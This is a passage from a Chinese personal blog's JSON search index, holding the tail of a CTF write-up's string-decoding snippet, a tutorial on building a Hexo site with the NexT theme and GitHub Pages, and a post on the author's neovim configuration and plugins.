style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e62\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e69\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e68\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e53\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e62\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e69\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint urllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eunquote(a\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003eb)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e得到代码如下：\u003c/p\u003e","title":"bugku writeup"},{"content":"基础修改 修改 _config.yml，写上网站的标题\ntitle: subtitle: description: 选择主题\ntheme: next hexo 插件 字数统计和阅读时长统计 https://github.com/theme-next/hexo-symbols-count-time\n在 _config.yml 中添加\nsymbols_count_time: symbols: true time: true total_symbols: true total_time: true exclude_codeblock: false awl: 4 wpm: 275 suffix: \u0026#34;mins.\u0026#34; 在Next主题中的 _config.yml中添加\nsymbols_count_time: separated_meta: true item_text_post: true item_text_total: true git 部署 在你的github账户上创建仓库yourusername.github.io，必须是用户名开头命名，否则github page不会生效。\n首先生成个人公私钥\ncd ssh-keygen -t rsa -C \u0026#34;your_email@example.com\u0026#34; 然后将公钥粘贴进github账户的个人设置里面 ssh -T git@github.com git config --global user.name \u0026#34;username\u0026#34; git config --global user.email \u0026#34;email\u0026#34; 在博客目录下下载：\nnpm install hexo-deployer-git --save 修改网站根目录下的_config.yml文件\ndeploy: - type: git#注意git的前面要加空格否则不生效 repo: https://github.com/example/example.github.io.git branch: master 保存退出后执行命令：\ngit config --global user.email \u0026#34;you@example.com\u0026#34; git config --global user.name \u0026#34;Your Name\u0026#34; hexo d #部署 也可以部署到个人网站上面，需要用到git hook，可以去参考别的博客\ndeploy: - type: git repo: root@xxx.xxx.xxx.xxx:blog.git branch: master - type: git repo: git@github.com:xxx/xxx.github.io.git branch: master Next 主题定制 主页：https://github.com/theme-next/hexo-theme-next\n主题选择 进入hexo-theme-next目录下的_config.yml文件，依据个人偏好修改风格：\n# Schemes # scheme: Muse # scheme: Mist # scheme: Pisces # scheme: Gemini # 选择一个喜欢的，去掉#即可 启动下面的darkmode，这样网页会随着浏览器\n友链 在主题的_config.yml文件里面的link项目里面设置即可。\n顶部加载条 主页 https://github.com/theme-next/theme-next-pace\ngit clone https://github.com/theme-next/theme-next-pace source/lib/pace 然后_config.yml中选择\n# Progress bar in the top during page loading. # Dependencies: https://github.com/theme-next/theme-next-pace # For more information: https://github.com/HubSpot/pace pace: enable: true # Themes list: # big-counter | bounce | barber-shop | center-atom | center-circle | center-radar | center-simple # corner-indicator | fill-left | flat-top | flash | loading-bar | mac-osx | material | minimal theme: corner-indicator 自定义图标 https://www.easyicon.net/language.en/iconsearch\n下载32的,然后放在主题文件中的images文件中,在配置中搜索favicon并修改\n头像 将喜欢的头像放在images里面然后在配置中搜索avatar并修改\n社交链接 social: GitHub: https://github.com/ch4ser-go || fab fa-github E-Mail: mailto:ch4ser.go@gmail.com || fa fa-envelope Telegram: https://t.me/darkch4ser || fab fa-telegram RSS: /atom.xml || fa fa-rss 暗黑模式持久化 修改 themes/next/source/css/_colors.styl\nif (hexo-config(\u0026#39;darkmode\u0026#39;)) { :root { --body-bg-color: $body-bg-color-dark; --content-bg-color: $content-bg-color-dark; --card-bg-color: $card-bg-color-dark; --text-color: $text-color-dark; --blockquote-color: $blockquote-color-dark; --link-color: $link-color-dark; --link-hover-color: $link-hover-color-dark; --brand-color: $brand-color-dark; --brand-hover-color: $brand-hover-color-dark; --table-row-odd-bg-color: $table-row-odd-bg-color-dark; --table-row-hover-bg-color: $table-row-hover-bg-color-dark; --menu-item-bg-color: $menu-item-bg-color-dark; --btn-default-bg: $btn-default-bg-dark; --btn-default-color: $btn-default-color-dark; --btn-default-border-color: $btn-default-border-color-dark; --btn-default-hover-bg: $btn-default-hover-bg-dark; --btn-default-hover-color: $btn-default-hover-color-dark; --btn-default-hover-border-color: $btn-default-hover-border-color-dark; } img { opacity: .75; \u0026amp;:hover { opacity: .9; } } } 修改主题配置文件，修改codeblock\ncodeblock: # Code Highlight theme # Available values: normal | night | night eighties | night blue | night bright | solarized | solarized dark | galactic # See: https://github.com/chriskempson/tomorrow-theme highlight_theme: night eighties # Add copy button on codeblock copy_button: enable: true # Show text copy result. show_result: true # Available values: default | flat | mac style: license 添加 修改next主题配置文件\n# Creative Commons 4.0 International License. # See: https://creativecommons.org/share-your-work/licensing-types-examples # Available values of license: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero # You can set a language value if you prefer a translated version of CC license, e.g. deed.zh # CC licenses are available in 39 languages, you can find the specific and correct abbreviation you need on https://creativecommons.org creative_commons: license: by-nc-sa sidebar: false post: true language: 然后修改博客目录下的_config.yml，加上自己的url\nurl: http://www.ch4ser.top 图床问题 以前都是用github的图床, 现在直接放在本地了\n我是在source下面新建了一个images文件夹, 然后在所有文章的开头都加上typora-root-url: ../, 同时在偏好里面设置图片存储位置为../images/${filename} , 这样子typora在插入图片的时候就会把他放在/source/images下面的对应文章文件夹下面了, 同时勾选使用相对路径。再也不用图床啦.\n","permalink":"https://ch3n9w.github.io/posts/tech-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/","summary":"\u003ch2 id=\"基础修改\"\u003e基础修改\u003c/h2\u003e\n\u003cp\u003e修改 _config.yml，写上网站的标题\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003etitle:\nsubtitle:\ndescription:\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e选择主题\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003etheme: next\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"hexo-插件\"\u003ehexo 插件\u003c/h2\u003e\n\u003ch3 id=\"字数统计和阅读时长统计\"\u003e字数统计和阅读时长统计\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/theme-next/hexo-symbols-count-time\"\u003ehttps://github.com/theme-next/hexo-symbols-count-time\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e在 _config.yml 中添加\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esymbols_count_time:\n  symbols: true\n  time: true\n  total_symbols: true\n  total_time: true\n  exclude_codeblock: false\n  awl: 4\n  wpm: 275\n  suffix: \u0026#34;mins.\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在Next主题中的 _config.yml中添加\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esymbols_count_time:\n  separated_meta: true\n  item_text_post: true\n  item_text_total: true\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"git-部署\"\u003egit 部署\u003c/h3\u003e\n\u003cp\u003e在你的github账户上创建仓库\u003ccode\u003eyourusername.github.io\u003c/code\u003e，必须是用户名开头命名，否则\u003ccode\u003egithub page\u003c/code\u003e不会生效。\u003c/p\u003e\n\u003cp\u003e首先生成个人公私钥\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecd\nssh-keygen -t rsa -C \u0026#34;your_email@example.com\u0026#34;\n然后将公钥粘贴进github账户的个人设置里面\nssh -T git@github.com\ngit config --global user.name \u0026#34;username\u0026#34;\ngit config --global user.email \u0026#34;email\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在博客目录下下载：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enpm install hexo-deployer-git --save\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e修改网站根目录下的_config.yml文件\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003edeploy:\n  - type: git#注意git的前面要加空格否则不生效\n  \trepo: https://github.com/example/example.github.io.git\n  \tbranch: master\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e保存退出后执行命令：\u003c/p\u003e","title":"使用hexo和github搭建网站"},{"content":"ch3n9w 的 vim 本篇文章中的插件均已过时, 不推荐使用\n《程序员修炼之道》中有一句话:最好是精通一种编辑器，并将其用于所有编辑任务。如果不坚持使用一种编辑器，可能会面临现代的巴别特大混乱。 ，实质今日，深以为然。而自从接触vim之后我一直都保持着有空折腾折腾的好习惯，它的简洁和高度自由让人着迷，围绕着vim衍生出的插件数不胜数。奈何插件繁多的同时也意味着选择的困难和配置的繁琐。为了准备以后可能出现的突发情况比如配置丢失或者重新安装，特在此以实现特定功能为主题，记录自己配置vim的过程。\n相比较vim, neovim的速度更快.\n为了调动食欲,先上效果图:\nvim下打开终端\n以下内容是配置 安装（vim-plug） curl -fLo ~/.local/share/nvim/site/autoload/plug.vim --create-dirs \\ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim ~/.config/nvim/init.vim \u0026#34; c to caplock , add XKBOPTIONS=\u0026#34;caps:escape\u0026#34; in /etc/default/keyboard \u0026#34; 让进入vim的时候显示绝对行号,当进入编辑模式的时候也显示绝对行号,但是从编辑模式回到普通模式的时候切换到相对行号 set number augroup relative_numbser autocmd! autocmd InsertEnter * :set norelativenumber autocmd InsertLeave * :set relativenumber augroup END set wildmenu \u0026#34; 忽略大小写 set ignorecase set shell=/bin/zsh \u0026#34; font and icons for vim set encoding=utf8 \u0026#34; set guifont=DroidSansMono\\ Nerd\\ Font\\ 11 autocmd User Startified setlocal buflisted \u0026#34; leader键映射 let mapleader=\u0026#34;\\\u0026lt;Space\u0026gt;\u0026#34; map \u0026lt;leader\u0026gt;w :w\u0026lt;CR\u0026gt; map \u0026lt;leader\u0026gt;q :q!\u0026lt;CR\u0026gt; map \u0026lt;leader\u0026gt;r :call Runit()\u0026lt;CR\u0026gt; \u0026#34; 设定函数,自动根据文件类型来调用相应的解释器来执行代码 func Runit() if \u0026amp;filetype == \u0026#39;php\u0026#39; exec \u0026#34;!time php %\u0026#34; elseif \u0026amp;filetype == \u0026#39;python\u0026#39; exec \u0026#34;!time python %\u0026#34; elseif \u0026amp;filetype == \u0026#39;c\u0026#39; exec \u0026#34;!gcc % -o %\u0026lt;\u0026#34; exec \u0026#34;!time sudo ./%\u0026lt;\u0026#34; elseif \u0026amp;filetype == \u0026#39;cpp\u0026#39; exec \u0026#34;!g++ % -o %\u0026lt;\u0026#34; exec \u0026#34;!time ./%\u0026lt;\u0026#34; endif endfunc \u0026#34; \u0026#34; set shift width set shiftwidth=4 set scrolloff=6 \u0026#34; 启动鼠标 set mouse=n map \u0026lt;ScrollWheelUp\u0026gt; \u0026lt;C-Y\u0026gt; map \u0026lt;ScrollWheelDown\u0026gt; \u0026lt;C-E\u0026gt; \u0026#34; 关于多窗口的键位映射 map vs :vs map sp :sp map \u0026lt;leader\u0026gt;l \u0026lt;C-w\u0026gt;l map \u0026lt;leader\u0026gt;h \u0026lt;C-w\u0026gt;h map \u0026lt;leader\u0026gt;j \u0026lt;C-w\u0026gt;j map \u0026lt;leader\u0026gt;k \u0026lt;C-w\u0026gt;k map \u0026lt;leader\u0026gt;L \u0026lt;C-w\u0026gt;L map \u0026lt;leader\u0026gt;H \u0026lt;C-w\u0026gt;H map \u0026lt;leader\u0026gt;J \u0026lt;C-w\u0026gt;J map \u0026lt;leader\u0026gt;K \u0026lt;C-w\u0026gt;K \u0026#34; 终端模式 map te :vs\u0026lt;CR\u0026gt;\u0026lt;C-w\u0026gt;L:te\u0026lt;CR\u0026gt;A tnoremap \u0026lt;esc\u0026gt; \u0026lt;C-\\\u0026gt;\u0026lt;C-n\u0026gt; \u0026#34; 关于多标签模式的设定 map tn :tabnew map L :tabnext\u0026lt;CR\u0026gt; map H :tabprev\u0026lt;CR\u0026gt; \u0026#34; 代码折叠 set foldmethod=indent set foldlevel=99 \u0026#34; \u0026#34; 高亮当前的行和列 set cursorcolumn set cursorline highlight CursorLine cterm=NONE ctermbg=black ctermfg=green highlight CursorColumn cterm=NONE ctermbg=black ctermfg=green \u0026#34; 这段代码可以让每次打开文件的时候将光标定位到上一次所在的位置 au BufReadPost * if line(\u0026#34;\u0026#39;\\\u0026#34;\u0026#34;) \u0026gt; 1 \u0026amp;\u0026amp; line(\u0026#34;\u0026#39;\\\u0026#34;\u0026#34;) \u0026lt;= line(\u0026#34;$\u0026#34;) | exe \u0026#34;normal! g\u0026#39;\\\u0026#34;\u0026#34; | endif \u0026#34; 引入插件 source ~/.vim/plugins.vim \u0026#34; 这个是为了在编写python的时候方便在vim内部浏览python文档而添加的，在github上有 \u0026#34; source ~/.vim/pydoc.vim/ftplugin/python_pydoc.vim ~/.vim/plugins.vim call plug#begin(\u0026#39;~/.vim/plugged\u0026#39;) \u0026#34; 代码补全插件 \u0026#34; Plug \u0026#39;neoclide/coc.nvim\u0026#39;, {\u0026#39;branch\u0026#39;: \u0026#39;release\u0026#39;} Plug \u0026#39;ncm2/ncm2\u0026#39; Plug \u0026#39;ncm2/ncm2-jedi\u0026#39; Plug \u0026#39;ncm2/ncm2-bufword\u0026#39; Plug \u0026#39;ncm2/ncm2-path\u0026#39; Plug \u0026#39;roxma/nvim-yarp\u0026#39; Plug \u0026#39;phpactor/phpactor\u0026#39; , {\u0026#39;do\u0026#39;: \u0026#39;composer install\u0026#39;, \u0026#39;for\u0026#39;: \u0026#39;php\u0026#39;} Plug \u0026#39;phpactor/ncm2-phpactor\u0026#39; \u0026#34; 外观插件 Plug \u0026#39;KeitaNakamura/neodark.vim\u0026#39; Plug \u0026#39;cocopon/iceberg.vim\u0026#39; Plug \u0026#39;vim-airline/vim-airline\u0026#39; Plug \u0026#39;ryanoasis/vim-devicons\u0026#39; \u0026#34; 代码结构显示 Plug \u0026#39;vim-scripts/taglist.vim\u0026#39; \u0026#34; 代码标记,并且可以在标记之间跳转 Plug \u0026#39;MattesGroeger/vim-bookmarks\u0026#39; \u0026#34; 目录树 Plug \u0026#39;scrooloose/nerdtree\u0026#39; \u0026#34; 括号自动补全 Plug \u0026#39;jiangmiao/auto-pairs\u0026#39; \u0026#34; 快速注释 Plug \u0026#39;scrooloose/nerdcommenter\u0026#39; \u0026#34; 花里胡哨的小插件，可以让打字发出音乐 \u0026#34; Plug \u0026#39;skywind3000/vim-keysound\u0026#39; call plug#end() \u0026#34; Plugin setting \u0026#34; source /home/ch3n9w/.vim/plugset/nerdtree.vim source /home/ch3n9w/.vim/plugset/ncm2.vim source /home/ch3n9w/.vim/plugset/bookmark.vim source /home/ch3n9w/.vim/plugset/airline.vim source /home/ch3n9w/.vim/plugset/taglists.vim source /home/ch3n9w/.vim/plugset/autopair.vim source /home/ch3n9w/.vim/plugset/nerdcomment.vim \u0026#34; source ~/.vim/plugset/keysound.vim ~/.vim/plugset/ncm2.vim inoremap \u0026lt;expr\u0026gt; \u0026lt;Tab\u0026gt; pumvisible() ? \u0026#34;\\\u0026lt;C-n\u0026gt;\u0026#34; : \u0026#34;\\\u0026lt;Tab\u0026gt;\u0026#34; inoremap \u0026lt;expr\u0026gt; \u0026lt;S-Tab\u0026gt; pumvisible() ? \u0026#34;\\\u0026lt;C-p\u0026gt;\u0026#34; : \u0026#34;\\\u0026lt;S-Tab\u0026gt;\u0026#34; inoremap \u0026lt;expr\u0026gt; \u0026lt;CR\u0026gt; (pumvisible() ? \u0026#34;\\\u0026lt;c-y\u0026gt;\\\u0026lt;cr\u0026gt;\u0026#34;: \u0026#34;\\\u0026lt;CR\u0026gt;\u0026#34;) autocmd BufEnter * call ncm2#enable_for_buffer() set completeopt=noinsert,menuone,noselect let ncm2#popup_delay = 5 let g:ncm2#matcher = \u0026#34;substrfuzzy\u0026#34; let g:ncm2_jedi#python_version = 3 let g:ncm2#match_highlight = \u0026#39;sans-serif\u0026#39; ~/.vim/plugset/airline.vim \u0026#34;if you want to enable solarized theme ,quote the snipeet \u0026#34; 这段代码让vim支持插件所需的色彩 if (empty($TMUX)) if (has(\u0026#34;nvim\u0026#34;)) \u0026#34;For Neovim 0.1.3 and 0.1.4 \u0026lt; https://github.com/neovim/neovim/pull/2198 \u0026gt; let $NVIM_TUI_ENABLE_TRUE_COLOR=1 endif \u0026#34;For Neovim \u0026gt; 0.1.5 and Vim \u0026gt; patch 7.4.1799 \u0026lt; https://github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 \u0026gt; \u0026#34;Based on Vim patch 7.4.1770 (`guicolors` option) \u0026lt; https://github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd \u0026gt; \u0026#34; \u0026lt; https://github.com/neovim/neovim/wiki/Following-HEAD#20160511 \u0026gt; if (has(\u0026#34;termguicolors\u0026#34;)) set termguicolors endif endif \u0026#34;airline setting let g:airline_symbols = {} let g:airline_left_sep = \u0026#39;\u0026#39; let g:airline_left_alt_sep = \u0026#39;\u0026#39; let g:airline_right_sep = \u0026#39;\u0026#39; let g:airline_right_alt_sep = \u0026#39;\u0026#39; let g:airline_symbols.branch = \u0026#39;\u0026#39; let g:airline_symbols.readonly = \u0026#39;\u0026#39; let g:airline_symbols.linenr = \u0026#39;\u0026#39; let g:airline#extensions#tabline#enabled = 1 let g:airline#extensions#tabline#show_buffers = 0 let g:airline#extensions#tabline#show_tabs = 1 let g:airline#extensions#tabline#fnamemod = \u0026#39;:t\u0026#39; let g:airline#extensions#tabline#left_sep = \u0026#39; \u0026#39; let g:airline#extensions#tabline#left_alt_sep = \u0026#39;|\u0026#39; \u0026#34; \u0026#34; 主题设置 \u0026#34; color schema \u0026#34;主题设置为冰山主题 \u0026#34; colorscheme iceberg \u0026#34; let g:airline_theme=\u0026#39;iceberg\u0026#39; \u0026#34; let g:lightline = {\u0026#39;colorscheme\u0026#39;: \u0026#39;iceberg\u0026#39;} \u0026#34; \u0026#34; 设置主题为onedark colorscheme neodark ~/.vim/plugset/nerdcomment.vim \u0026#34; comment plugin setting \u0026#34;comment followed a space let g:NERDSpaceDelims=1 ~/.vim/plugset/autopair.vim \u0026#34; autopair setting let g:AutoPairsShortcutJump = \u0026#39;\u0026lt;S-Tab\u0026gt;\u0026#39; let g:AutoPairsShortcutFastWrap=\u0026#39;\u0026lt;C-z\u0026gt;\u0026#39; ~/.vim/plugset/nerdtree.vim \u0026#34; T 打开nerdree窗口，在左侧栏显示 map T :NERDTreeToggle\u0026lt;CR\u0026gt;\u0026lt;leader\u0026gt;l \u0026#34;close vim if the only window left open is a NERDTree autocmd bufenter * if (winnr(\u0026#34;$\u0026#34;) == 1 \u0026amp;\u0026amp; exists(\u0026#34;b:NERDTree\u0026#34;) \u0026amp;\u0026amp; b:NERDTree.isTabTree()) | q | endif ~/.vim/plugset/keysound.vim \u0026#34;launch with vim let g:keysound_enable = 1 \u0026#34;set default sound let g:keysound_theme = \u0026#39;default\u0026#39; \u0026#34; let g:keysound_theme = \u0026#39;typewriter\u0026#39; \u0026#34; let g:keysound_theme = \u0026#39;sword\u0026#39; \u0026#34; let g:keysound_theme = \u0026#39;mario\u0026#39; \u0026#34; let g:keysound_theme = \u0026#39;bubble\u0026#39; \u0026#34; set python version let g:keysound_py_version = 2 \u0026#34;volumn setting \u0026#34; 其实设置这么大,早就超过极限了 let g:keysound_volumn = 100000 ~/.vim/plugset/taglists.vim map \u0026lt;leader\u0026gt;t :TlistToggle\u0026lt;CR\u0026gt; \u0026#34;设置召唤键 let Tlist_WinWidth=30 \u0026#34;设置taglist宽度 let Tlist_Exit_OnlyWindow=1 \u0026#34;tagList窗口是最后一个窗口，则退出Vim let Tlist_Use_Right_Window = 0 \u0026#34; 不同时显示多个文件的 tag ，只显示当前文件的 \u0026#34; let Tlist_Show_One_File=1 \u0026#34;让当前不被编辑的文件的方法列表自动折叠起来 let Tlist_File_Fold_Auto_Close=1 ~/.vim/plugset/bookmark.vim let g:bookmark_sign = \u0026#39;\u0026gt;\u0026gt;\u0026#39; let g:bookmark_highlight_lines = 1 \u0026#34; unmap mp nmap mN \u0026lt;Plug\u0026gt;BookmarkPrev 源码审计 sudo apt install ctags #切到待审计文件夹下的根目录下,执行 ctags -R 生成全局的标签文件 然后我们进入一个代码文件,光标放在某一个函数名或者是宏上,按下Ctrl + ], vim就可以自动切换到该函数定义处,要返回只需要按下Ctrl + o 或者 Ctrl + t sudo apt-get install xcape # make CapsLock behave like Ctrl: setxkbmap -option ctrl:nocaps # make short-pressed Ctrl behave like Escape: xcape -e \u0026#39;Control_L=Escape\u0026#39; see the link below:\nhttp://tiborsimko.org/capslock-escape-control.html\n由于这样的做法会让caplock反应变慢,因此我不用这种方法,而是传统的修改keyboard文件来达到简单的esc映射效果.\n","permalink":"https://ch3n9w.github.io/posts/tech-ch4ser-vim/","summary":"\u003ch1 id=\"ch3n9w-的-vim\"\u003ech3n9w 的 vim\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本篇文章中的插件均已过时, 不推荐使用\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e《程序员修炼之道》中有一句话:\u003ccode\u003e最好是精通一种编辑器，并将其用于所有编辑任务。如果不坚持使用一种编辑器，可能会面临现代的巴别特大混乱。\u003c/code\u003e ，实质今日，深以为然。而自从接触vim之后我一直都保持着有空折腾折腾的好习惯，它的简洁和高度自由让人着迷，围绕着vim衍生出的插件数不胜数。奈何插件繁多的同时也意味着选择的困难和配置的繁琐。为了准备以后可能出现的突发情况比如配置丢失或者重新安装，特在此以实现特定功能为主题，记录自己配置vim的过程。\u003c/p\u003e","title":"ch3n9w 的 vim"}]